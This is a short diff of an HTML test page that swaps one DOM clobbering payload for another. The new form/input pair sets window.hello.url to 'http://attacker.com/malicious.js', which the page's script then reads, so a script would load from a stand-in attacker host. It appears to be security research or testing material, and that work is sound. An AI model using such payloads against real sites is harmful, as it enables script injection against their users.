@@ -5,10 +5,14 @@
 </head>
 <body>
     /////clobbering payload/////
-    <a id="hello"><\a>
-    <a id="hello" name=url href="https://gaeunbae.github.io/hello.js"></a>
+<!--     <a id="hello"><\a>
+    <a id="hello" name=url href="https://gaeunbae.github.io/hello.js"></a> -->
     ///////////////////////////
 <!--     <a id="hello" href="clobbered:TAINT_window_hello_1_1"></a> -->
+    <form name="hello">
+        <input name="url" value="http://attacker.com/malicious.js">
+    </form>
+
   
     <script>
         let someObject = window.hello || {};
